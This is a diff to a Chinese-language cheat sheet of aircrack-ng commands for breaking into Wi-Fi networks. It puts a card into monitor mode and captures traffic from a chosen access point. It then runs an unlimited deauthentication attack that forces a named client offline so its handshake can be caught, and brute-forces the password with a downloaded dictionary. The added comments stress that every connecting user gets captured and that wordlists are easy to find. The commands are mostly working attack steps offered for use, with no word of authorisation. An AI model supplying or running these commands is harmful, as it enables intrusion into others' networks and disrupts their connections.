@@ -41,15 +41,15 @@ airodump-ng <处于监听模式的网卡名称> # 用这个监听网卡扫描附
 # ESSID: 无线网络的名称
 
 
-airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称> # 使用参数过滤扫描列表，确定扫描目标,可以出指定wifi哪些人在使用
+airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称> # 使用参数过滤扫描列表，确定扫描目标,可以出指定wifi哪些人在使用 只要有人链接这个wifi就会被抓包
 # airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon
 # BSSID: 无线 AP 的硬件地址
 # STATION: 用户设备的硬件地址
 
-aireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 对目标设备发起ack攻击
+aireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 对目标设备发起ack攻击 让他强制下线 方便他重新链接抓包成功
 # aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
 
-aircrack-ng -w 密码字典 <包含握手包的 cap 文件> # 使用 aircrack-ng 暴力破解 Wi-Fi 密码 成功会返回 KEY FOUND!
+aircrack-ng -w 密码字典 <包含握手包的 cap 文件> # 使用 aircrack-ng 暴力破解 Wi-Fi 密码 成功会返回 KEY FOUND! 密码字典去网上下载多得很 
 # aircrack-ng -w wpa-dictionary/common.txt android-01.cap 
 
 airmon-ng stop <处于监听模式的无限网卡名称> # 无线网卡退出监听模式
